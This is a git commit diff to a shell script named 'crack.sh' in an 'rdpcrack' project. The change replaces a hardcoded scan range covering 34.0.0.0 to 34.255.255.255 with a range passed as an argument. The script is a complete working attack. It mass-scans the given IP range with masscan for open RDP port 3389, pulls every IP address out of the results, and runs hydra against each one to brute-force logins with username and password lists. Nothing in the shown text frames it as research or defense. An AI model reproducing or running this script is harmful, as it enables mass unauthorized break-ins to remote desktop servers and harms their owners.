984be9a23e0fb5e31b4d81e31317436c52ad8668
Remi Girard <54126451+ind3p3nd3nt@users.noreply.github.com>
2021-08-30 13:23:57 -0400

    Update crack.sh

--- rdpcrack/crack.sh
+++ rdpcrack/crack.sh
@@ -1,3 +1,3 @@
-masscan --range 34.0.0.0-34.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
+masscan --range $1 --rate 50000 -p3389 --open --banners -oG rdp.scan;
 for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -e ns -L user -P pass -t1 -W1 -I >hydra.log;
 done
